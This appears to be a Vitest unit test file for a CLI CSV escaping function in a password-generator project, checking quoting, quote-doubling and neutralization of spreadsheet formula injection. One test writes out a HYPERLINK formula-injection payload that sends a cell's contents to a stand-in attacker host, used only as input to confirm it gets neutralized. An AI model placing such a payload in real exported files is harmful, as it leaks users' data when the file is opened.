import { describe, expect, it } from "vitest";
import { escapeCsvCompat, CSV_FORMULA_TRIGGER_RE } from "../../lib/csv-escape.js";

// Parity test mirroring src/lib/format/csv-escape.test.ts. The CLI escaper is a
// deliberate duplicate of the app module (separate ESM package); these cases
// pin both to identical behavior so they cannot drift silently.
describe("escapeCsvCompat (CLI)", () => {
  it("leaves a plain value unquoted (compatibility format)", () => {
    expect(escapeCsvCompat("hello")).toBe("hello");
  });

  it("quote-wraps a value containing a comma", () => {
    expect(escapeCsvCompat("a,b")).toBe('"a,b"');
  });

  it("doubles embedded quotes and wraps", () => {
    expect(escapeCsvCompat('a"b')).toBe('"a""b"');
  });

  it.each(["=", "+", "-", "@", "\t", "\r"])(
    "neutralizes a formula-triggering cell starting with %j",
    (trigger) => {
      const out = escapeCsvCompat(`${trigger}cmd`);
      expect(out).toBe(`"'${trigger}cmd"`);
    },
  );

  it("neutralizes the HYPERLINK exfiltration payload", () => {
    const out = escapeCsvCompat('=HYPERLINK("http://attacker/"&C2)');
    expect(out.startsWith("\"'=")).toBe(true);
  });

  it("applies RS6 ordering: quote-doubling runs before the formula decision", () => {
    const out = escapeCsvCompat('="x"');
    expect(out).toBe('"\'=""x"""');
  });

  it("neutralizes a password that legitimately starts with a trigger char", () => {
    // Real passwords can begin with symbols from the generator's symbol groups.
    expect(escapeCsvCompat("-p@ssw0rd!")).toBe("\"'-p@ssw0rd!\"");
  });

  it("CSV_FORMULA_TRIGGER_RE matches only leading trigger chars", () => {
    expect(CSV_FORMULA_TRIGGER_RE.test("=a")).toBe(true);
    expect(CSV_FORMULA_TRIGGER_RE.test("a=b")).toBe(false);
  });
});
